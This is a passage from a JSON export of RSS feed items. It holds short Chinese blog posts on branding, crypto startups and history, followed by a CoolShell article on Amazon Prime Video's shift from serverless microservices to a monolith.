          "content": "<p>Github 创始人说，（作为公司）当你朝着别人说 “快来看我好酷我好棒啊” 是没有用的，你要帮助别人变得更好，你才会更好。这是别人把你的贴纸贴在电脑上的原因。</p>\n<p>别人贴你的贴纸，跟你的公司没有半毛钱关系，<strong>大家只是在 communicating values</strong>。</p>\n<p>如果你没有传递这种 value，你就没有 branding，因为大家 have nothing to communicate。</p>\n<p><strong>&ldquo;Let me help you be better.&rdquo;</strong></p>\n<p>That’s the reason people put your sticker on their laptop.</p>\n<p>It has nothing to do with the company. People are communicating their values, “I care about open source””I like coding”&hellip; People share the same value as github.</p>\n<p>I suggest you view branding this way。If you have no discernable values then nobody will care about your brand because it’s not communicating anything, no believing in it.</p>\n<p><strong>You have to believe in something.</strong></p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/branding1/",
          "creator": "Luyao",
          "pubDate": "Fri, 16 Apr 2021 12:20:25 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "6700067440a9604385e4e908db2a4609",
          "highlights": []
        },
        {
          "title": "Crypto的项目流程",
          "description": "<p>A16Z 以及他们投的几个顶级项目，推荐的项目流程基本上是：</p>\n<ol>\n<li><strong>核心团队开发产品，找到 product-market fit</strong>，</li>\n<li><strong>然后建立 community</strong>，</li>\n<li><strong>最后一步是把项目交给 community，以及发币什么的</strong>。</li>\n</ol>\n<p>但<strong>现在很多团队是反过来的</strong>，特别是 17 年 ICO 那会，大家是先发币，在产品还没有的时候，先把钱给拿了，或者上来就把项目 owned by community。<strong>这些都被证明是不可行的。</strong></p>\n",
          "content": "<p>A16Z 以及他们投的几个顶级项目，推荐的项目流程基本上是：</p>\n<ol>\n<li><strong>核心团队开发产品，找到 product-market fit</strong>，</li>\n<li><strong>然后建立 community</strong>，</li>\n<li><strong>最后一步是把项目交给 community，以及发币什么的</strong>。</li>\n</ol>\n<p>但<strong>现在很多团队是反过来的</strong>，特别是 17 年 ICO 那会，大家是先发币，在产品还没有的时候，先把钱给拿了，或者上来就把项目 owned by community。<strong>这些都被证明是不可行的。</strong></p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/crypto_project_routine/",
          "creator": "Luyao",
          "pubDate": "Mon, 12 Apr 2021 16:19:48 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "7542acab147836497c3863b6b90eb1f6",
          "highlights": []
        },
        {
          "title": "错误激励政策的可怕后果",
          "description": "<p><img src=\"https://zhangluyao.com/images/economics/Maurice_Duplessis.jpg\" alt=\"Maurice Duplessis\"></p>\n<p>上世纪四五十年代，加拿大魁北克的总理叫 Maurice Duplessis，他同时管理孤儿院和精神病院。</p>\n<p>当时联邦政府有个政策，给每照顾一个孤儿补贴 2 块钱一天，每照顾一个精神病人补贴 7 块钱一天。</p>\n<p>于是 Maurice 想，为什么不把这些孩子变成精神病人呢，这样就可以让我的报酬提升 3.5 倍了。</p>\n<p>他真的这么做了，直接导致了 2 万个儿童被误诊为精神疾病并关在精神病院。</p>\n<p>这就是臭名昭著的 Duplessis Orphans 事件。</p>\n",
          "content": "<p><img src=\"https://zhangluyao.com/images/economics/Maurice_Duplessis.jpg\" alt=\"Maurice Duplessis\"></p>\n<p>上世纪四五十年代，加拿大魁北克的总理叫 Maurice Duplessis，他同时管理孤儿院和精神病院。</p>\n<p>当时联邦政府有个政策，给每照顾一个孤儿补贴 2 块钱一天，每照顾一个精神病人补贴 7 块钱一天。</p>\n<p>于是 Maurice 想，为什么不把这些孩子变成精神病人呢，这样就可以让我的报酬提升 3.5 倍了。</p>\n<p>他真的这么做了，直接导致了 2 万个儿童被误诊为精神疾病并关在精神病院。</p>\n<p>这就是臭名昭著的 Duplessis Orphans 事件。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/economics/",
          "creator": "Luyao",
          "pubDate": "Sat, 10 Apr 2021 16:29:08 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "c5bdf3e152dafe6952a4c9bdf9149e66",
          "highlights": []
        },
        {
          "title": "HaydenAdams 访谈",
          "description": "<ul>\n<li><strong>当时更多是把构建 Uniswap 看作一种以太坊学习</strong>。</li>\n<li>当时最大的 DEX 是 EtherDelta，但对他来说太复杂了，他没有金融背景。</li>\n<li>UX 仅仅是一方面，但更重要的是底层的去中心化、抗审查、Permissionless。<strong>当时所有的 DEX，都没有 Ethereum 那种底层属性（去中心化）</strong>。Ethereum 吸引他的点是不需要相信任何人、不会被下线、Permissionless。但如果看当时所有的项目，比如 EtherDelta，他们都没有这些属性。</li>\n<li>于是他开始思考：<strong>What is it like to build on top of Ethereum that has the same properties Ethereum itself that everyone cares about</strong>.</li>\n<li>2018 年在做的事情是去各种 Ethereum 活动，见领域里各种人，同时把 uniswap 做成一个更完整的版本。</li>\n<li>以太坊基金会的注资，给了他更多责任感去推进项目，因为 “有人花钱让我做这事儿了”。</li>\n<li>以太坊基金会投了 10 万美金，包括 5 万美金和 100 个左右的以太坊，主要是审计用。结果收到以太坊的时候，以太坊币价已经跌了一大半了。</li>\n<li>写 Uniswap 期间，为了生活，几乎把以太坊卖光了。</li>\n<li>他说当时加密圈很期待他的项目，但他把 AMM 的想法跟周围做传统金融的朋友们讲时，<strong>所有人的反应都是这不可能 work，还给他列举了各种不 work 的原因</strong>。</li>\n</ul>\n",
          "content": "<ul>\n<li><strong>当时更多是把构建 Uniswap 看作一种以太坊学习</strong>。</li>\n<li>当时最大的 DEX 是 EtherDelta，但对他来说太复杂了，他没有金融背景。</li>\n<li>UX 仅仅是一方面，但更重要的是底层的去中心化、抗审查、Permissionless。<strong>当时所有的 DEX，都没有 Ethereum 那种底层属性（去中心化）</strong>。Ethereum 吸引他的点是不需要相信任何人、不会被下线、Permissionless。但如果看当时所有的项目，比如 EtherDelta，他们都没有这些属性。</li>\n<li>于是他开始思考：<strong>What is it like to build on top of Ethereum that has the same properties Ethereum itself that everyone cares about</strong>.</li>\n<li>2018 年在做的事情是去各种 Ethereum 活动，见领域里各种人，同时把 uniswap 做成一个更完整的版本。</li>\n<li>以太坊基金会的注资，给了他更多责任感去推进项目，因为 “有人花钱让我做这事儿了”。</li>\n<li>以太坊基金会投了 10 万美金，包括 5 万美金和 100 个左右的以太坊，主要是审计用。结果收到以太坊的时候，以太坊币价已经跌了一大半了。</li>\n<li>写 Uniswap 期间，为了生活，几乎把以太坊卖光了。</li>\n<li>他说当时加密圈很期待他的项目，但他把 AMM 的想法跟周围做传统金融的朋友们讲时，<strong>所有人的反应都是这不可能 work，还给他列举了各种不 work 的原因</strong>。</li>\n</ul>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/hayden/",
          "creator": "Luyao",
          "pubDate": "Thu, 08 Apr 2021 20:37:29 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "c9a2a9db00a9c8bca57660e5a1af6d42",
          "highlights": []
        },
        {
          "title": "护城河",
          "description": "<p>Crypto 的项目一切透明，想法透明、代码透明、交易透明、融资透明，完全没有信息差。</p>\n<p>但却<strong>拥有更强的护城河。这种护城河来自于 multi-sided platform 上的网络效应，一旦形成后，就很难迁移。</strong></p>\n",
          "content": "<p>Crypto 的项目一切透明，想法透明、代码透明、交易透明、融资透明，完全没有信息差。</p>\n<p>但却<strong>拥有更强的护城河。这种护城河来自于 multi-sided platform 上的网络效应，一旦形成后，就很难迁移。</strong></p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/moat/",
          "creator": "Luyao",
          "pubDate": "Thu, 08 Apr 2021 20:34:23 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "76a103937b2b059dadd00241aabd3f68",
          "highlights": []
        },
        {
          "title": "财神庙",
          "description": "<p>在杭州时去了财神庙，听李阳说之去过的几个人都变成了巨富。</p>\n<p>爬了有可能一个小时，累死了，顶上还没开，庙在翻修。</p>\n<p>于是我心想，<strong>搞不好财神庙这种东西，是一个反向的筛选。就是如果你真能爬那么多山为了去一个破财神庙，那你一定真的很想发财，还有执行力。那这样的人多半都会有钱</strong>。</p>\n<p>所以最后就变成了，去过财神庙的人都很有钱。</p>\n<p>如果要我开一间财神庙，我肯定把这一套弄到极致。开在遥远的山里，开车也去不到，必须徒步行走三四天才能到的那种地方。完美地筛选出一批牛逼人士，最后江湖流传着去到这里就能发财的传说。</p>\n",
          "content": "<p>在杭州时去了财神庙，听李阳说之去过的几个人都变成了巨富。</p>\n<p>爬了有可能一个小时，累死了，顶上还没开，庙在翻修。</p>\n<p>于是我心想，<strong>搞不好财神庙这种东西，是一个反向的筛选。就是如果你真能爬那么多山为了去一个破财神庙，那你一定真的很想发财，还有执行力。那这样的人多半都会有钱</strong>。</p>\n<p>所以最后就变成了，去过财神庙的人都很有钱。</p>\n<p>如果要我开一间财神庙，我肯定把这一套弄到极致。开在遥远的山里，开车也去不到，必须徒步行走三四天才能到的那种地方。完美地筛选出一批牛逼人士，最后江湖流传着去到这里就能发财的传说。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/god/",
          "creator": "Luyao",
          "pubDate": "Wed, 07 Apr 2021 16:39:33 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "0c2d28acf0ef9f5b8c70d964fda5330f",
          "highlights": []
        },
        {
          "title": "CPA Attack",
          "description": "<p>密码学课上到 CPA（选择明文攻击），有个有趣的故事。</p>\n<p>二战时美军截获日军消息说要攻打一个叫 “AF” 的地方，猜测可能指中途岛。</p>\n<p>为了确认，<strong>美军故意在中途岛发了个未加密的消息</strong>，说物资短缺，果然日军马上传消息说 “AF 物资短缺”。</p>\n<p>这使得美军确认了 AF 就是中途岛，做好了战斗部署，最后打赢了战争。</p>\n",
          "content": "<p>密码学课上到 CPA（选择明文攻击），有个有趣的故事。</p>\n<p>二战时美军截获日军消息说要攻打一个叫 “AF” 的地方，猜测可能指中途岛。</p>\n<p>为了确认，<strong>美军故意在中途岛发了个未加密的消息</strong>，说物资短缺，果然日军马上传消息说 “AF 物资短缺”。</p>\n<p>这使得美军确认了 AF 就是中途岛，做好了战斗部署，最后打赢了战争。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/cpa/",
          "creator": "Luyao",
          "pubDate": "Sun, 04 Apr 2021 14:00:00 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "d1ff1aeea4237e3923aa4a2af8e639aa",
          "highlights": []
        },
        {
          "title": "公司制度的启发",
          "description": "<p>ChrisDixon 讲了一个超级超级有趣的故事。</p>\n<p>19 世纪主要的科技爆发来自于蒸汽机和火车。</p>\n<p>当时面临的主要问题是，有限责任公司还很少见，你要开公司必须去国会申请，所以大家只好选择普通合伙，也就是无限责任。这意味着，如果有人在你的火车上死了，所有合伙人都是要去坐牢的。</p>\n<p>大家往往会选择比较信任的人，如家族里的亲戚一起合伙。</p>\n<p>但火车的需求很旺盛。</p>\n<p>每两个城市间开通了火车，这两个城市的 GDP 都要翻 10 倍。</p>\n<p>这极大地激励了人们融资开铁路。</p>\n<p>为了更好地融资，你就得注册有限责任公司，于是当时的国会大厦前每天都排着长队……</p>\n<p>之所以有限公司方便融资，是因为这样你可以对别人说：“你给我钱就好了，出了事情你不用坐牢，顶多亏点钱”。</p>\n<p>但即便如此，有限责任公司也花了长大 30 年才被大家所接受。</p>\n<p>这种制度在当时引起了极大的争议，当时的媒体文章都会抨击说：<strong>如果社会都是有限责任公司，那必然到处都滋生犯罪，因为大家不用承担责任了！</strong></p>\n<p>Chris 认为有限公司和蒸汽机、电报一样，都是很重要的科技发明。</p>\n<p>同时他认为<strong>crypto 如今的处境，和有限公司当年是一模一样的</strong>。有限公司将股东数量从十几个人扩展到上百万人，而 crypto 将股东数量扩展到了几十亿人。</p>\n",
          "content": "<p>ChrisDixon 讲了一个超级超级有趣的故事。</p>\n<p>19 世纪主要的科技爆发来自于蒸汽机和火车。</p>\n<p>当时面临的主要问题是，有限责任公司还很少见，你要开公司必须去国会申请，所以大家只好选择普通合伙，也就是无限责任。这意味着，如果有人在你的火车上死了，所有合伙人都是要去坐牢的。</p>\n<p>大家往往会选择比较信任的人，如家族里的亲戚一起合伙。</p>\n<p>但火车的需求很旺盛。</p>\n<p>每两个城市间开通了火车，这两个城市的 GDP 都要翻 10 倍。</p>\n<p>这极大地激励了人们融资开铁路。</p>\n<p>为了更好地融资，你就得注册有限责任公司，于是当时的国会大厦前每天都排着长队……</p>\n<p>之所以有限公司方便融资，是因为这样你可以对别人说：“你给我钱就好了，出了事情你不用坐牢，顶多亏点钱”。</p>\n<p>但即便如此，有限责任公司也花了长大 30 年才被大家所接受。</p>\n<p>这种制度在当时引起了极大的争议，当时的媒体文章都会抨击说：<strong>如果社会都是有限责任公司，那必然到处都滋生犯罪，因为大家不用承担责任了！</strong></p>\n<p>Chris 认为有限公司和蒸汽机、电报一样，都是很重要的科技发明。</p>\n<p>同时他认为<strong>crypto 如今的处境，和有限公司当年是一模一样的</strong>。有限公司将股东数量从十几个人扩展到上百万人，而 crypto 将股东数量扩展到了几十亿人。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/chris/",
          "creator": "Luyao",
          "pubDate": "Wed, 24 Mar 2021 20:50:01 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "c559e9b119b34495dfefda9c69184647",
          "highlights": []
        },
        {
          "title": "Brian Armstrong 谈 Product-Market Fit",
          "description": "<p>Talk to users, improve your product.</p>\n<p><strong>“这个循环要持续很久，通常要几年。大部分人只持续几个月就放弃了，这对于你的 startup 是没有任何帮助的。”</strong></p>\n<p>“以我的经验，这个时间会很长，比你预期的长很多。最后会有一些用户留下来每天来用你的产品，你会看到活跃用户开始增长，而不是平的或下跌。”</p>\n<p>Crypto 的 Product/Market Fit 和这个不会有什么区别。</p>\n",
          "content": "<p>Talk to users, improve your product.</p>\n<p><strong>“这个循环要持续很久，通常要几年。大部分人只持续几个月就放弃了，这对于你的 startup 是没有任何帮助的。”</strong></p>\n<p>“以我的经验，这个时间会很长，比你预期的长很多。最后会有一些用户留下来每天来用你的产品，你会看到活跃用户开始增长，而不是平的或下跌。”</p>\n<p>Crypto 的 Product/Market Fit 和这个不会有什么区别。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/product_market_fit/",
          "creator": "Luyao",
          "pubDate": "Tue, 23 Mar 2021 20:52:10 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "baa81c34e2a796d52069455360689b6d",
          "highlights": []
        }
      ],
      "folder": "log",
      "name": "zhangluyao",
      "language": "en",
      "hash": "cd5e699293703bc2baf66124720cb029"
    },
    {
      "title": "酷 壳 – CoolShell",
      "subtitle": "",
      "link": "https://coolshell.cn",
      "image": null,
      "description": "享受编程和技术所带来的快乐 - Coding Your Ambition",
      "items": [
        {
          "title": "是微服务架构不香还是云不香？",
          "description": "<p>这两天技术圈里热议的一件事就是Amazon的流媒体平台Prime Video在2023年3月22日发布了一篇技术博客《规模化Prime Video的音视频监控服...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22422.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22422.html\">是微服务架构不香还是云不香？</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-medium wp-image-22424\" src=\"https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices-300x200.png\" alt=\"\" width=\"300\" height=\"200\" srcset=\"https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices-300x200.png 300w, https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices-768x512.png 768w, https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices-405x270.png 405w, https://coolshell.cn/wp-content/uploads/2023/05/monolith.microservices.png 800w\" sizes=\"(max-width: 300px) 100vw, 300px\" />这两天技术圈里热议的一件事就是Amazon的流媒体平台Prime Video在2023年3月22日发布了一篇技术博客《<a title=\"Scaling up the Prime Video audio/video monitoring service and reducing costs by 90%\" href=\"https://www.primevideotech.com/video-streaming/scaling-up-the-prime-video-audio-video-monitoring-service-and-reducing-costs-by-90\" target=\"_blank\" rel=\"noopener\">规模化Prime Video的音视频监控服务，成本降低90%</a>》，副标题：“<strong>从分布式微服务架构到单体应用程序的转变有助于实现更高的规模、弹性和降低成本</strong>”，有人把这篇文章在五一期间转到了<a href=\"https://www.reddit.com/r/programming/comments/137alxn/prime_video_switched_from_serverless_to_ec2_and/\" target=\"_blank\" rel=\"noopener\">reddit</a> 和 <a href=\"https://news.ycombinator.com/item?id=35811741\" target=\"_blank\" rel=\"noopener\">hacker news</a> 上，在Reddit上热议。这种话题与业内推崇的微服务架构形成了鲜明的对比。从“微服务架构”转“单体架构”，还是Amazon干的，这个话题足够劲爆。然后DHH在刚<a href=\"https://twitter.com/dhh/status/1655076668787097607\" target=\"_blank\" rel=\"noopener\">喷完Typescript</a>后继续发文《<a href=\"https://world.hey.com/dhh/even-amazon-can-t-make-sense-of-serverless-or-microservices-59625580\" target=\"_blank\" rel=\"noopener\">即便是亚马逊也无法理解Servless或微服务</a>》，继续抨击微服务架构，于是，瞬间引爆技术圈，登上技术圈热搜。</p>\n<p>今天上午有好几个朋友在微信里转了三篇文章给我，如下所示：</p>\n<ul>\n<li>《<a href=\"https://mp.weixin.qq.com/s/mEmz8pviahEAWy1-SA8vcg\" target=\"_blank\" rel=\"noopener\">微服务是不是个蠢主意？</a>》</li>\n<li>《<a href=\"https://mp.weixin.qq.com/s/7zm5YyeZhQ2mu2TJvOK5tQ\" target=\"_blank\" rel=\"noopener\">单体回归？亚马逊放弃用于视频监控的微服务</a> 》</li>\n<li>《<a href=\"https://mp.weixin.qq.com/s/fQtAMf4BfJxdBPWDE5ygwg\" target=\"_blank\" rel=\"noopener\">从微服务转为单体架构、成本降低 90%，亚马逊内部案例引发轰动</a>》</li>\n</ul>\n<p>看看这些标题就知道这些文章要的是流量而不是好好写篇文章。看到第二篇，你还真当 Prime Video 就是 Amazon 的全部么？然后，再看看这些文章后面的跟风评论，我觉得有 80%的人只看标题，而且是连原文都不看的。所以，我想我得写篇文章了……</p>\n<p><span id=\"more-22422\"></span></p>\n<h4>原文解读</h4>\n<p>要认清这个问题首先是要认认真真读一读原文，Amazon Prime Video 技术团队的这篇文章并不难读，也没有太多的技术细节，但核心意思如下：</p>\n<p>1）<strong>这个系统是一个监控系统，用于监控数据千条用户的点播视频流</strong>。主要是监控整个视频流运作的质量和效果（比如：视频损坏或是音频不同步等问题），这个监控主要是处理视频帧，所以，他们有一个微服务主要是用来把视频拆分成帧，并临时存在 S3 上，就是下图中的 Media Conversion 服务。</p>\n<p>2）<strong>为了快速搭建系统，Prime Video团队使用了Serverless 架构，也就是著名的 AWS Lambda 和 AWS Step Functions</strong>。前置 Lambda 用来做用户请求的网关，Step Function 用来做监控（探测器），有问题后，就发 SNS 上，Step Function 从 S3 获取 Media Conversion 的数据，然后把运行结果再汇总给一个后置的 Lambda ，并存在 S3 上。</p>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter wp-image-22423 \" src=\"https://coolshell.cn/wp-content/uploads/2023/05/prime.01.webp\" alt=\"\" width=\"624\" height=\"496\" srcset=\"https://coolshell.cn/wp-content/uploads/2023/05/prime.01.webp 1011w, https://coolshell.cn/wp-content/uploads/2023/05/prime.01-300x238.webp 300w, https://coolshell.cn/wp-content/uploads/2023/05/prime.01-768x610.webp 768w, https://coolshell.cn/wp-content/uploads/2023/05/prime.01-340x270.webp 340w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p>整个架构看上去非常简单 ，一点也不复杂，而且使用了 Serverless 的架构，一点服务器的影子都看不见。<strong>实话实说，这样的开发不香吗？我觉得很香啊，方便快捷，完全不理那些无聊的基础设施，直接把代码转成服务，然后用 AWS 的 Lamda + Step Function + SNS + S3 分分钟就搭出一个有模有样的监控系统了，哪里不好了？！</strong></p>\n<p>但是他们遇到了一个比较大的问题，就是 AWS Step Function 的伸缩问题，从文章中我看到了两个问题（注意前方高能）：</p>\n<ol>\n<li>需要很多很多的并发的 AWS Step Function ，于是达到了帐户的 hard limit。</li>\n<li>AWS Step Function 按状态转换收费，所以，贵得受不了了。</li>\n</ol>\n<p>注意，这里有两个关键点：1）<strong>帐户对 Step Function 有限制</strong>，2）<strong>Step Function 太贵了用不起</strong>。</p>\n<p>然后，Prime Video 的团队开始解决问题，下面是解决的手段：</p>\n<p>1） 把 Media Conversion  和 Step Function 全部写在一个程序里，Media Conversion 跟 Step Function 里的东西通过内存通信，不再走S3了。结果汇总到一个线程中，然后写到 S3.</p>\n<p>2）把上面这个单体架构进行分布式部署，还是用之前的 AWS Lambda 来做入门调度。</p>\n<p>EC2 的水平扩展没有限制，而且你想买多少 CPU/MEM 的机器由你说了算，而这些视频转码，监控分析的功能感觉就不复杂，本来就应该写在一起，这么做不更香吗？当然更香，比前面的 Serverless 的确更香，因为如下的几个原因：</p>\n<ol>\n<li>不再受 Step Function 的限制了，技术在自己手里，有更大的自由度。</li>\n<li>没有昂贵的 Step Function 云成本的确变得更低了，如果你把 Lambda 换成 Nginx 或 Spring Gateway 或是我司的 <a href=\"https://github.com/megaease/easegress\" target=\"_blank\" rel=\"noopener\">Easegress</a>，你把 S3 换成 MinIO，你把 SNS 换成 Kafka，你的成本 还能再低。</li>\n</ol>\n<h4>独立思考</h4>\n<p>好了，原文解读完了，你有自己的独立思考了吗？下面是我的独立思考，供你参考：</p>\n<p>1）<strong>AWS 的 Serverless 也好， 微服务也好，单体也好，在合适的场景也都很香</strong>。这就跟汽车一样，跑车，货车，越野车各有各的场景，你用跑车拉货，还是用货车泡妞都不是一个很好的决定。</p>\n<p>2）<strong>这篇文章中的这个例子中的业务太过简单了，本来就是一两个服务就可以干完的事。</strong>就是一个转码加分析的事，要分开的话，就两个微服务就好了（一个转码一个分析），做成流式的。如果不想分，合在一起也没问题了，这个粒度是微服务没毛病。微服务的划分有好些原则，我这里只罗列几个比较重要的原则：</p>\n<ul>\n<li><strong>边界上下文</strong>。微服务的粒度不能大于领域驱动里的 Bounded Context（具体是什么 大家自行 Google），也就是一个业务域。</li>\n<li><strong>单一职责，高内聚，低耦合</strong>。把因为相同原因变化的合在一起（内聚），把不同原因变化的分开（解耦）</li>\n<li><strong>事务和一致性</strong>。对于两个重度依赖的功能，需要完成一个事务和要保证强一致性的，最好不要拆开，要放在一起。</li>\n<li><strong>跟组织架构匹配</strong>。把同一个团队的东西放在一起，不同团队的分开。</li>\n</ul>\n<p>3）<strong>Prime Video 遇到的问题不是技术问题，而是 AWS  Step Function 处理能力不足，而且收费还很贵的问题</strong>。这个是 AWS 的产品问题，不是技术问题。或者说，这个是Prime Video滥用了Step Function的问题（本来这种大量的数据分析处理就不适合Step Function）。所以，大家不要用一个产品问题来得到微服务架构有问题的结论，这个没有因果关系。<strong>试问，如果 Step Funciton 可以无限扩展，性能也很好，而且白菜价，那么 Prime Video 团队还会有动力改成单体吗？他们不会反过来吹爆 Serverless 吗？</strong></p>\n<p>4）Prime Video 跟 AWS 是两个独立核算的公司，就像 Amazon 的电商和 AWS 一样，也是两个公司。Amazon 的电商和 AWS 对服务化或是微服务架构的理解和运维，我个人认为这个世界上再也找不到另外一家公司了，包括 Google 或 Microsoft。你有空可以看看本站以前的这篇文章《<a title=\"SteveY对Amazon和Google平台的吐槽\" href=\"https://coolshell.cn/articles/5701.html\">Steve Yegg对Amazon和Google平台的吐槽</a>》你会了解的更多。</p>\n<p>5）<strong>Prime Video 这个案例本质上是“下云”，下了 AWS Serverless 的云</strong>。云上的成本就是高，一个是费用问题，另一个是被锁定的问题。Prime Video 团队应该很庆幸这个监控系统并不复杂，重写起来也很快，所以，可以很快使用一个更传统的“服务化”+“云计算”的分布式架构，不然，就得像 DHH 那样咬牙下云——《<a href=\"https://world.hey.com/dhh/why-we-re-leaving-the-cloud-654b47e0\" target=\"_blank\" rel=\"noopener\">Why We&#8217;re Leaving the Cloud</a>》（他们的 SRE 的这篇博文 <a href=\"https://dev.37signals.com/our-cloud-spend-in-2022/\" target=\"_blank\" rel=\"noopener\">Our Cloud Spend in 2022</a>说明了下云的困难和节约了多少成本）</p>\n<h4>后记</h4>\n<p>最后让我做个我自己的广告。我在过去几年的创业中，帮助了很多公司解决了这些 分布式，微服务，云原生以及云计算成本的问题，如果你也有类似问题。欢迎，跟我联系：<a href=\"mailto:haoel@hotmail.com\">haoel@hotmail.com</a></p>\n<p>另外，我们今年发布了一个平台 MegaEase Cloud，<strong> 就是想让用户在不失去云计算体验的同时，通过自建高可用基础架构的方式来获得更低的成本（至少降 50%的云计算成本）。</strong>目前可以降低成本的方式：</p>\n<ol>\n<li>基础软件：通过开源软件自建，</li>\n<li>内容分发：MinIO + Cloudflare 的免费 CDN，</li>\n<li>马上准备发布的直接与底层IDC合作的廉价GPU计算资源…</li>\n</ol>\n<p><strong>欢迎大家试用。</strong></p>\n<p><strong>如何访问</strong></p>\n<ul>\n<li>中国区:   <a href=\"https://cloud.megaease.cn\" target=\"_blank\" rel=\"noopener\">https://cloud.megaease.cn </a></li>\n<li>国际区：<a href=\"https://cloud.megaease.com\" target=\"_blank\" rel=\"noopener\">https://cloud.megaease.com</a></li>\n</ul>\n<p><strong>注：这两个区完全独立，帐号不互通。因为网络的不可抗力，千万不要跨区使用。</strong></p>\n<p><strong>产品演示</strong></p>\n<ul>\n<li><a href=\"https://www.bilibili.com/video/BV17v4y1R7mA/\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/BV17v4y1R7mA/</a></li>\n</ul>\n<p><strong>介绍文章</strong></p>\n<ul>\n<li><a href=\"https://megaease.cn/zh/blog/2023/02/15/welcome-to-megaease-cloud/\" target=\"_blank\" rel=\"noopener\">欢迎使用 MegaEase Cloud </a></li>\n<li><a href=\"https://megaease.cn/zh/blog/2023/04/06/megaease-cloud-2023.03-significant-update/\" target=\"_blank\" rel=\"noopener\">2023 年 03 月重大更新</a></li>\n</ul>\n<p>&nbsp;</p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" id=\"wp_rp_first\"><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/17737.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/03/Amazon-Web-Services-Down-150x150.png\" alt=\"AWS 的 S3 故障回顾和思考\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/17737.html\" class=\"wp_rp_title\">AWS 的 S3 故障回顾和思考</a></li><li ><a href=\"https://coolshell.cn/articles/10476.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2013/10/huarong-150x150.png\" alt=\"C++11的Lambda使用一例：华容道求解\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/10476.html\" class=\"wp_rp_title\">C++11的Lambda使用一例：华容道求解</a></li><li ><a href=\"https://coolshell.cn/articles/4601.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg\" alt=\"关于Amazon云宕机的网贴收集\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/4601.html\" class=\"wp_rp_title\">关于Amazon云宕机的网贴收集</a></li><li ><a href=\"https://coolshell.cn/articles/10249.html\" class=\"wp_rp_thumbnail\"><img 